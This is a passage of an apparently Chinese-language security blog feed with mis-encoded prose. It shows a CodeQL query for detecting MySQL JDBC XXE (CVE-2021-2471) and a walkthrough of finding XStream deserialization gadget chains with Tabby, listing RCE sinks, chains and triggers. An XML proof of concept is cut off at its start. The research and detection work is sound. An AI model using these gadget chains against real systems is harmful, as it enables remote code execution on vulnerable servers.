JDBC4FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:488, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:425, Util (com.mysql.jdbc)</span><br><span class="line">connect:78, FabricMySQLDriver (com.mysql.fabric.jdbc)</span><br><span class="line">getConnection:677, DriverManager (java.sql)</span><br><span class="line">getConnection:251, DriverManager (java.sql)</span><br></pre></td></tr></table></figure><h2 id="CodeQL-with-Mysql-XXE"><a href="#CodeQL-with-Mysql-XXE" class="headerlink" title="CodeQL with Mysql XXE"></a>CodeQL with Mysql XXE</h2><p>5.*çš„éœ€è¦å®‰è£…jdk5ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œä»¥8.0.26ä¸ºä¾‹</p><h3 id="Build-Mysql-QL-DB"><a href="#Build-Mysql-QL-DB" class="headerlink" title="Build Mysql QL DB"></a>Build Mysql QL DB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># download mysql-connector-j</span></span><br><span class="line">wget https://github.com/mysql/mysql-connector-j/archive/refs/tags/8.0.25.tar.gz -O mysql-connector-j-8.0.25.tar.gz</span><br><span class="line">tar -xzvf mysql-connector-j-8.0.25.tar.gz &amp;&amp; <span class="built_in">cd</span> mysql-connector-j-8.0.25</span><br><span class="line"></span><br><span class="line">mkdir lib &amp;&amp; <span class="built_in">cd</span> lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># download ant build libs</span></span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-api/5.6.2/junit-jupiter-api-5.6.2.jar -O junit-jupiter-api-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-engine/5.6.2/junit-jupiter-engine-5.6.2.jar -O junit-jupiter-engine-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-commons/1.6.2/junit-platform-commons-1.6.2.jar -O junit-platform-commons-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-engine/1.6.2/junit-platform-engine-1.6.2.jar -O junit-platform-engine-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-launcher/1.6.2/junit-platform-launcher-1.6.2.jar -O junit-platform-launcher-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar -O apiguardian-api-1.1.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/opentest4j/opentest4j/1.2.0/opentest4j-1.2.0.jar -O opentest4j-1.2.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/javassist/javassist/3.27.0-GA/javassist-3.27.0-GA.jar -O javassist-3.27.0-GA.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/google/protobuf/protobuf-java/3.11.4/protobuf-java-3.11.4.jar -O protobuf-java-3.11.4.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/mchange/c3p0/0.9.5.5/c3p0-0.9.5.5.jar -O c3p0-0.9.5.5.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar -O slf4j-api-1.7.30.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/hamcrest/hamcrest/2.2/hamcrest-2.2.jar -O hamcrest-2.2.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># build.properties</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cat &lt;&lt; EOF &gt; build.properties</span><br><span class="line">com.mysql.cj.build.jdk=<span class="variable">$JAVA_HOME</span></span><br><span class="line">com.mysql.cj.extra.libs=./lib</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># codeql build</span></span><br><span class="line">codeql database create mysql-qldb -l java --<span class="built_in">command</span>=<span class="string">&quot;ant dist&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Run-QL-Search"><a href="#Run-QL-Search" class="headerlink" title="Run QL Search"></a>Run QL Search</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> MySQL JDBC XXE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> mysql jdbc xxe.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@problem</span>.severity error</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@precision</span> high</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id</span> java/xxe</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@tags</span> security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-611</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.security.XmlParsers</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.TaintTracking2</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.frameworks.Jdbc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MySQLJdbcSource</span> <span class="keyword">extends</span> <span class="title">RemoteFlowSource</span> </span>&#123;</span><br><span class="line">  MySQLJdbcSource()&#123;</span><br><span class="line">    exists(MethodAccess m | m = <span class="keyword">this</span>.asExpr() |</span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.protocol.a&quot;</span>, <span class="string">&quot;SimplePacketReader&quot;</span>)</span><br><span class="line">        and (m.getMethod().hasName(<span class="string">&quot;readMessage&quot;</span>) or m.getMethod().hasName(<span class="string">&quot;readHeader&quot;</span>))</span><br><span class="line">      )</span><br><span class="line">      or </span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc.result&quot;</span>, <span class="string">&quot;ResultSetImpl&quot;</span>) </span><br><span class="line">        and (m.getMethod().getName().substring(<span class="number">0</span>, <span class="number">3</span>) = <span class="string">&quot;get&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function">override string <span class="title">getSourceType</span><span class="params">()</span> </span>&#123; result = <span class="string">&quot;jdbc&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">class SafeSAXSourceFlowConfig extends TaintTracking2::Configuration &#123;</span><br><span class="line">  SafeSAXSourceFlowConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XmlParsers::SafeSAXSourceFlowConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src.asExpr() <span class="keyword">instanceof</span> SafeSAXSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">    sink.asExpr() = any(XmlParserCall parse).getSink()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override <span class="keyword">int</span> <span class="title">fieldFlowBranchLimit</span><span class="params">()</span> </span>&#123; result = <span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UnsafeXxeSink extends DataFlow::ExprNode &#123;</span><br><span class="line">  UnsafeXxeSink() &#123;</span><br><span class="line">    <span class="function">not <span class="title">exists</span><span class="params">(SafeSAXSourceFlowConfig safeSource | safeSource.hasFlowTo(<span class="keyword">this</span>)</span>) and</span></span><br><span class="line"><span class="function">    <span class="title">exists</span><span class="params">(XmlParserCall parse |</span></span></span><br><span class="line"><span class="function"><span class="params">      parse.getSink()</span> </span>= <span class="keyword">this</span>.getExpr() and</span><br><span class="line">      not parse.isSafe()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XxeConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  XxeConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XXE.ql::XxeConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123; sink <span class="keyword">instanceof</span> UnsafeXxeSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, XxeConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;Unsafe parsing of XML file from $@.&quot;</span>, source.getNode(),</span><br><span class="line">  <span class="string">&quot;user input&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-181.png" alt="upload successful"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Postgresqlå¾ˆæ—©å°±æœ‰XXE CVEï¼Œæ¨ªå‘æ€ç»´æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¯æƒœè¿˜æ˜¯ä¸å¤Ÿä¸èƒ½ä¸»åŠ¨å‘ç°ğŸ˜­</p><p>CodeQLæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨æ„å»ºè°ƒç”¨å›¾çš„åŸºç¡€ä¸Šï¼Œæœ‰ä¸€å¥—è§£é‡Šå‹è¯­è¨€æ¥è¿›è¡Œæœç´¢ï¼Œæ¯”neo4jè¦æ–¹ä¾¿å¾ˆå¤šã€‚å€¼å¾—æ·±å…¥å­¦ä¹ ï¼Œæœ¬ç¯‡ç®—æ˜¯è®°å½•CodeQLå­¦ä¹ çš„å…¥é—¨ç¯‡ï¼ŒæœŸå¾…ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://paper.seebug.org/1324/">ä½¿ç”¨ CodeQL åˆ†æé—­æº Java ç¨‹åº</a></li><li>[2] <a href="https://github.com/github/codeql/issues/4304">can codeql analyse java rt.jar source code? #4304</a></li><li>[3] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-installing-source.html">SQL Connector/J 8.0 Developer Guide  /  Connector/J Installation  /  Installing from Source</a></li><li>[4] <a href="https://codeql.github.com/codeql-query-help/java/">CodeQL query help for Java</a></li><li>[5] <a href="https://github.com/SecCoder-Security-Lab/jdbc-sqlxml-xxe">SecCoder-Security-Lab/jdbc-sqlxml-xxe </a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;pyn3rdå¸ˆå‚…çš„ã€ŠMake JDBC Attack Brilliant Againã€‹ä¸­æœ‰ä¸€ä¸ª0dayæ˜¯mysql jdbc xxeï¼Œthread3amå¸ˆå‚…ä¹Ÿæ—©å°±å¤ç°å‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜å‘ç°äº†h2çš„xxeã€‚è†œä¸€ä¸ªï¼Œå¸ˆå‚…ä»¬éƒ½å¤ªğŸ‚ğŸºäº†ã€‚å¾ˆå¤šå¸ˆå‚…ä»¬ä¹Ÿå¤ç°äº†ï¼Œå†è®²ä¹Ÿæ²¡å•¥æ„æ€äº†ï¼Œç”¨CodeQLæ•´ç‚¹æ–°çš„å§ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;CVE-2021-2471 mysql jdbc xxeåœ¨HITB ppté‡Œé¢ï¼Œæ²¡æœ‰è®²DOMSource XXEè¿™ä¸€éƒ¨åˆ†ï¼ŒåŸå› åº”è¯¥æ˜¯pyn3rdå¸ˆå‚…ææ¼æ´è¿˜æœªå…¬å¼€ï¼Œæ²¡å†™åœ¨ppté‡Œé¢ã€‚æ‰€ä»¥è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªä¸œè¥¿ï¼š&lt;/p&gt;
&lt;p&gt; a. DOMSource XXE, å½±å“æ‰€æœ‰ç‰ˆæœ¬ï¼Œå®˜æ–¹8.0.27ä¸­ä¿®å¤æ‰äº†&lt;/p&gt;
&lt;p&gt; b. Fabric XXE, å½±å“5.x, åœ¨5.1.49ä¸­ä¿®å¤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CodeQL CWE-611æœ‰XXEçš„æ£€æµ‹pocï¼Œä¸è¿‡sourceæºä¸æ”¯æŒmysqlã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;CVE-2021-2471&quot;&gt;&lt;a href=&quot;#CVE-2021-2471&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-2471&quot;&gt;&lt;/a&gt;CVE-2021-2471&lt;/h2&gt;&lt;h3 id=&quot;DOMSource-XXE&quot;&gt;&lt;a href=&quot;#DOMSource-XXE&quot; class=&quot;headerlink&quot; title=&quot;DOMSource XXE&quot;&gt;&lt;/a&gt;DOMSource XXE&lt;/h3&gt;&lt;p&gt;æ¼æ´ä»£ç åœ¨ com.mysql.cj.jdbc.MysqlSQLXML#getSource&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Mysql" scheme="http://m0d9.me/tags/Mysql/"/>
    
    <category term="XXE" scheme="http://m0d9.me/tags/XXE/"/>
    
    <category term="Fabric" scheme="http://m0d9.me/tags/Fabric/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–ï¼ˆä¸‰ï¼‰â€”â€”Tabby CVEä¹‹æ—…</title>
    <link href="http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/"/>
    <id>http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</id>
    <published>2021-08-29T09:03:00.000Z</published>
    <updated>2022-03-28T03:33:41.126Z</updated>
    
    <content type="html"><![CDATA[<p>æœˆåº•åœ¨å³ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿ï¼Œæ¯æœˆä¸€ç¯‡éƒ½è¦é£Ÿè¨€äº†ã€‚ä¸Šä¸ªæœˆåˆšæŒ–çš„OpenRASPçš„å‘ï¼Œæœ¬æ‰“ç®—å†ç ”ç©¶ç ”ç©¶ç»•è¿‡å§¿åŠ¿ï¼ŒéªŒè¯ä¸‹çŒœæƒ³ï¼Œä¹Ÿæ²¡ä¸‹æ–‡ã€‚æ­£å¥½6æœˆä»½äº¤çš„XStream SSRF Gadget CVEä¸‹æ¥ï¼Œä¹‹å‰XStreamç³»åˆ—è‰ç¨¿ç®±é‡Œä¹Ÿå¾…ç€ä¹‹å‰é€†å‘åˆ†æå¸ˆå‚…ä»¬æŒ–æ˜çš„æ€è·¯&amp;æ‰‹æ³•ï¼Œæ­£å¥½ç¼–è¾‘ç¼–è¾‘ï¼Œæ°´ä¸€ç¯‡â€å¦‚ä½•æŒ–æ˜XStream Gadgetsâ€ã€‚</p><p>é¦–å…ˆæ„Ÿè°¢Wh1t3p1gå¸ˆå‚…çš„Tabbyï¼Œç”¨èµ·æ¥æ¯”gadgetinspectoræ›´é¡ºæ‰‹ï¼Œæ‰¾é“¾ç¥å™¨ã€‚</p><h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>æœ‰å…³Tabbyçš„ä»‹ç»ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒã€1ã€‘ä¸­Wh1t3p1gå¸ˆå‚…çš„å‡ ä¸ªwikiï¼Œå†™çš„å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šå•°å—¦ã€‚ï¼ˆè¿™é‡Œè†œä¸€ä¸‹Wh1t3p1gå¸ˆå‚…ï¼‰</p><p>Neo4j æŸ¥è¯¢æ¯”è¾ƒåƒcpuï¼Œå°æœ¬æœ¬åŠ ä¸ŠideaåŒæ—¶è·‘åƒåŠ›ï¼Œæå°vpsè·‘æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯tabbyæ˜¯é€šè¿‡apoc.load.csv fileå†™Neo4jæ•°æ®çš„ï¼Œç›¸å½“äºé™åˆ¶äº†æœ¬æœºï¼Œå› æ­¤ç»™ä¸‹æ•´åº“çš„dumpå’Œloadï¼ˆå½“ç„¶ï¼Œç›´æ¥æ•´ä¸ªåœ¨vpsä¸Šæ“ä½œä¹Ÿæ˜¯okçš„ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump neo4j database</span></span><br><span class="line">neo4j-admin dump --to /tmp/neo4j.dump --database neo4j</span><br><span class="line"><span class="comment"># scp dump file to vps</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load neo4j dump file</span></span><br><span class="line">./bin/neo4j stop</span><br><span class="line">./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force</span><br><span class="line">./bin/neo4j start</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Gadgetsç»“æ„"><a href="#Gadgetsç»“æ„" class="headerlink" title="Gadgetsç»“æ„"></a>Gadgetsç»“æ„</h2><p>å‰æ–‡çš„ä¼—å¤šçš„RCE Gadgetsåˆ†æä¸­å‘ç°Gadgetsçš„ç»“æ„å¤§è‡´åˆ†ä¸ºï¼š</p><p><strong>Bulletï¼š</strong><br>å®ç°æœ€ç»ˆçš„RCE</p><p>rce:</p><ol><li>ProcessBuilder.start() æ— å‚æ•°</li><li>Runtime.getRuntime().exec(cmd) æœ‰å‚</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) æ— å‚</li><li>MethodClosure.call() æ— å‚</li></ol><p>ssrf:</p><ol><li>java.net.URL#openConnection</li></ol><p><strong>æ ¸å¿ƒä¸­é—´é“¾</strong><br>ä¸­é—´é“¾æ˜¯æ•´ä¸ªå¯»æ‰¾Gadgetsçš„æ ¸å¿ƒï¼Œç®€å•çš„å¯èƒ½æ²¡æœ‰ä¸­é—´é“¾ï¼Œå¤æ‚çš„å¯èƒ½ä¼šç»„åˆä½¿ç”¨</p><ol><li>invoke å®ç°ä¸Šæœ‰é—®é¢˜çš„ InvokeHandlerï¼Œå¦‚<ul><li>EventHandler</li><li>æ­é…MethodClosureçš„ConvertedClosure</li></ul></li><li>hashCodeã€compareã€equalå®ç°æœ‰é—®é¢˜çš„Map/Set/Queueï¼Œå¦‚<ul><li>Expandoï¼ŒhashCodeæ­é…MethodClosureå¯ä»¥RCE</li><li>CVE-2021-21345 ServerTableEntry verifyæ–¹æ³•å¯RCE</li></ul></li><li>å­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„classï¼ˆè¿™ä¸€ç±»æ™®éå­˜åœ¨ï¼‰<ul><li>CVE-2020-26217 ImageIO$ContainsFilterï¼Œfilteræ–¹æ³•å†…å¯æ§</li><li>CVE-2021-21344 Accessor$GetterSetterReflectionï¼Œgetæ–¹æ³•å¯æ§</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSomeæ–¹æ³•å†…invokeå¯æ§</li></ul></li><li>åˆ©ç”¨ClassLoaderå®ä¾‹åŒ–<ul><li>ServiceLoader$LazyIteratorï¼Œè°ƒç”¨ç‚¹ä¸ºClass.forName (name,initialize,loader) ï¼ŒæŒ‡å®šloaderä¸ºBCEL classLoaer</li><li>CVE-2021-21347ï¼Œè°ƒç”¨ç‚¹ä¸ºloader.loadClass(name).newInstance()ï¼Œåˆ©ç”¨java.net.URLClassLoaderåŠ è½½è¿œç¨‹jarç±»å¹¶å®ä¾‹åŒ–</li><li>CVE-2021-21350ï¼Œå’ŒLazyIteratorä¸€æ ·ï¼Œåˆ©ç”¨BCEL classLoader</li></ul></li></ol><p><strong>Triggerï¼š</strong><br>ç±»ä¼¼æ‰³æœºçš„ä½œç”¨ï¼Ÿæ•´ä¸ªé“¾çš„èµ·ç‚¹</p><ol><li>MapConverter/TreeSetConveter/TreeMapConveteréƒ½ä¼šè§¦å‘è¿™äº›é›†åˆ/è¡¨ å†…å…ƒç´ çš„å†…éƒ¨å‡½æ•°ï¼Œæ¯”å¦‚compareã€hashCodeã€equalsè¿™äº›å‡½æ•°ã€‚<ul><li>MapConverterç±»å‹putå¯¹è±¡æ—¶è°ƒç”¨è¯¥å¯¹è±¡çš„hashCodeã€equalsã€toStringæ–¹æ³•</li><li>TreeSetè°ƒç”¨putå¯¹è±¡æ—¶è°ƒç”¨è¯¥å¯¹è±¡çš„compareToæ–¹æ³•</li><li>PriorityQueueè§¦å‘comparatorå±æ€§ä¸­compareæ–¹æ³•</li></ul></li><li>DynamicProxyConverter ä»£ç†ç±»ï¼ŒInvocationHandlerå¯æ§ï¼Œå¯¼è‡´ä¸€äº›invokeå­˜åœ¨RCEé£é™©çš„InvocationHandlerç±»ï¼Œå¦‚EventHandlerï¼Œå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚</li></ol><h2 id="CVEs"><a href="#CVEs" class="headerlink" title="CVEs"></a>CVEs</h2><p>åœ¨äº†è§£äº†neo4j &amp; tabby &amp; Gadgesç»„æˆ çš„åŸºç¡€ä¸Šï¼Œé‚£å°±è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨Tabbyçš„æŒ–æ˜XStream Gadgetsã€‚ç²¾åŠ›æœ‰é™ï¼Œä»¥ä»¥ä¸‹å‡ ä¸ªCVEä¸ºä¾‹ï¼ˆéš¾æ˜“ç¨‹åº¦æ’åºï¼‰</p><ul><li>CVE-2021-21342 </li><li>CVE-2021-39152</li><li>CVE-2021-21351</li><li>CVE-2021-21346</li><li>CVE-2021-21347/21350</li><li>CVE-2020-26217</li><li>CVE-2021-21344/21345</li></ul><h3 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h3><h4 id="å¯»æ‰¾Bullet"><a href="#å¯»æ‰¾Bullet" class="headerlink" title="å¯»æ‰¾Bullet"></a>å¯»æ‰¾Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾ä¸­é—´é“¾"><a href="#å¯»æ‰¾ä¸­é—´é“¾" class="headerlink" title="å¯»æ‰¾ä¸­é—´é“¾"></a>å¯»æ‰¾ä¸­é—´é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openStream&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>èŠ‚ç‚¹å¾ˆå¤šï¼Œä»¥javax.activation.URLDataSource$getInputStream ä¸ºä¾‹</p><p><img src="/images/pasted-156.png" alt="upload successful"></p><h4 id="å¯»æ‰¾Trigger"><a href="#å¯»æ‰¾Trigger" class="headerlink" title="å¯»æ‰¾Trigger"></a>å¯»æ‰¾Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;getOutputStream&quot; and m1.CLASSNAME&#x3D;&quot;javax.activation.URLDataSource&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-161.png" alt="upload successful"></p><!-- ![upload successful](/images/pasted-144.png) --><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span 